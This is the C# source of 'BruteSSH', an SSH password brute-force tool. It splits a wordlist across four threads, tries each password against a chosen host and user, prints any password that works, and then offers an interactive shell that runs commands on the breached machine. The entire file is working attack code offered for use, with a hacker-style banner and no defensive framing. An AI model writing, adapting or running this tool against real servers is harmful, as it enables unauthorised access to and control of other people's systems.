/*
Program developed by Diego Berger Tellaroli - https://github.com/diego-tella/
It is still in development.
*/
using System;
using System.IO;
using Renci.SshNet;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;

namespace Brute_SSH
{
    class Program
    {
        //global variables
        public static bool bol1 = false;
        public static string[] senhas = new string[6]; //array used in the past version. Can be replaced by a simple string
        public static string wordlist;
        public static string ip, pass, user, word, port;
        public static int porta;
        public static bool bol2 = false;
        public static bool found = false;

        //lists for threads
        public static List<string> list1 = new List<string>();
        public static List<string> list2 = new List<string>();
        public static List<string> list3 = new List<string>();
        public static List<string> list4 = new List<string>();

        public static void banner()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@" ______   _______  _______  _______  _          _______  _______          ");
            Console.WriteLine(@"(  ___ \ (  ____ )(  ____ \(  ___  )| \    /\  (  ____ \(  ____ \|\     /|");
            Console.WriteLine(@"| (   ) )| (    )|| (    \/| (   ) ||  \  / /  | (    \/| (    \/| )   ( |");
            Console.WriteLine(@"| (__/ / | (____)|| (__    | (___) ||  (_/ /   | (_____ | (_____ | (___) |");
            Console.WriteLine(@"|  __ (  |     __)|  __)   |  ___  ||   _ (    (_____  )(_____  )|  ___  |");
            Console.WriteLine(@"| (  \ \ | (\ (   | (      | (   ) ||  ( \ \         ) |      ) || (   ) |");
            Console.WriteLine(@"| )___) )| ) \ \__| (____/\| )   ( ||  /  \ \  /\____) |/\____) || )   ( |");
            Console.WriteLine(@"|/ \___/ |/   \__/(_______/|/     \||_/    \/  \_______)\_______)|/     \|");
            Console.WriteLine("\n                                                 A simble Brute-Force SSH");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"          Github: https://github.com/diego-tella/BruteSSH");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(@"--------------------------------------------------------------------------");
        }

        public static void Main(string[] args)
        {
            begin(); //starts here
            Console.WriteLine("Loading wordlist..."); //after run the begin()
            wordlist = word;
            threads();

            try
            {
                //start 4 threads
                Console.WriteLine("Attack started with 4 threads.");
                Thread t = new Thread(() => Attack(list1));
                Thread t2 = new Thread(() => Attack(list2));
                Thread t3 = new Thread(() => Attack(list3));
                Thread t4 = new Thread(() => Attack(list4));
                t.Start();
                Thread.Sleep(500);
                t2.Start();
                Thread.Sleep(500);
                t3.Start();
                Thread.Sleep(500);
                t4.Start();

            }
            catch
            {
                Console.WriteLine("The file does not exist."); //this error just happen 'cause the files doesn't exist
                Environment.Exit(0);
            }
            

        }
        public static void threads()
        {
            try
            {
                StreamReader str = new StreamReader(wordlist);
                string word = "";
                int cont = 0;
                while ((word = str.ReadLine()) != null)
                {
                    cont++;
                    if (cont == 1) //tá pulando 1 a cada 5
                        list1.Add(word);
                    else if (cont == 2)
                        list2.Add(word);
                    else if (cont == 3)
                        list3.Add(word);
                    else if (cont == 4)
                        list4.Add(word);
                    else
                    {
                        cont = 1;
                        list1.Add(word);
                    }
                }
            }
            catch(Exception e)
            {
                Console.WriteLine("Wordlist was not found."); //there is not a file text called "wordlist" in the directory
                Environment.Exit(0);
            }
        }
        public static void begin()
        {
            banner();
            Console.ForegroundColor = ConsoleColor.Green; //green color of H4X0R 1337 XD
        volt2:
            Console.WriteLine("Enter the host");
            ip = Console.ReadLine();
            if (ip == "")
            {
                Console.WriteLine("Invalid IP");
                goto volt2;
            }

            Console.WriteLine("What is the port? (default 22)");
            port = Console.ReadLine();

        volt1:
            Console.WriteLine("What is the user?");
            user = Console.ReadLine();
            if (user == "")
            {
                Console.WriteLine("Invalid user. Type again!");
                goto volt1;
            }
            Console.WriteLine("What wordlist? (hit enter for the default.) ");
            word = Console.ReadLine();

            //verify
            if (word == "")
                word = "wordlist.txt";
            if (port == "")
                porta = 22;
            else
                porta = Convert.ToInt32(port);

            //Host active?
            try
            {
                TcpClient sh = new TcpClient();
                sh.Connect(ip, porta);
            }
            catch (Exception ex)
            {
                if (ex.ToString().Contains("10061"))
                {
                    Console.WriteLine("Port " + porta + " of IP " + ip + " is closed.");
                    Environment.Exit(0);
                }
                else if (ex.ToString().Contains("11001"))
                {
                    Console.WriteLine("The host " + ip + " does not exist. Canceling attack...");
                    Environment.Exit(0);
                }
                else if (ex.ToString().Contains("10060"))
                {
                    Console.WriteLine("The port" + porta + " is not in service. Do you want to try anyway? [y/n]");
                    string resp = Console.ReadLine();
                    if (resp == "n")
                        Environment.Exit(0);
                }
            }
        }
        public static int count = 0;
        public static void Attack(List<string> lista)
        {
            int ae = -1;
            StreamReader str = new StreamReader(word); //open wordlist
            foreach (var pass in lista) //start brute force
            {

                try
                {
                    if (found)
                        break;
                    else
                    {
                        using (var client = new SshClient(ip, porta, user, pass))
                        {
                            client.Connect(); //try connect
                            client.Disconnect(); //If you connect successfully, the password is correct
                            ae++;
                            senhas[ae] = pass; //save in an array
                            if (!found) //fixing bug
                            {
                                Console.WriteLine("[+] Password found - " + pass + "\nEnter 1 to open a shell\nEnter 2 to exit");
                                found = true;
                                string resp = Console.ReadLine();
                                if (resp == "1")
                                {
                                    Console.WriteLine("Opening shell...");
                                    client.Connect();

                                    while (true)
                                    {
                                        try
                                        {
                                            if (!bol2)
                                                Console.WriteLine("Shell opened. Type 'exit' to exit.");
                                            else
                                                Console.Write("$ ");
                                            bol2 = true;
                                            var comand = Console.ReadLine();
                                            var output = client.RunCommand(comand); //run the command on shell
                                            if (comand.ToString() == "exit")
                                                break;
                                            else
                                                Console.WriteLine(output.Result);
                                        }
                                        catch (Exception ex)
                                        {
                                            if (!ex.ToString().Contains("CommandText property is empty"))
                                                Console.WriteLine("Error!");
                                        }
                                    }
                                    client.Disconnect();
                                    end();
                                }
                                else //case 2 or another
                                    end();
                            }
                            else
                                break;
                           

                        }
                    }
                }
                catch (Exception ex)
                {
                    if (!found) //fixing bug
                    {
                        if (ex.ToString().Contains("Permission denied"))
                            Console.WriteLine("[+] Wrong password --> " + pass);
                        else if (ex.ToString().Contains("10051"))
                        {
                            Console.WriteLine("Could not connect to the target.");
                            bol1 = true;
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Unknown error: " + ex.ToString());
                            bol1 = true;
                            break;
                        }
                    }
                }

            }
            count++;
            if (count == 4)
            {
                end();
            }
        }
        public static int kpi = 0;
        public static void end()
        {
            kpi++;
            if (kpi != 1)
            {
                Console.WriteLine("\nEnd of the attack.");
                if (!bol1)
                {
                    Console.WriteLine("Password found for user " + user + ":");
                    bool found = false;
                    foreach (var item in senhas)
                    {
                        if (item != null)
                        {
                            Console.WriteLine("[+] " + item);
                            found = true;
                        }
                        if (!found)
                        {
                            Console.WriteLine("No password was found.");
                            break;
                        }
                    }
                }
            }
        }
    }

}
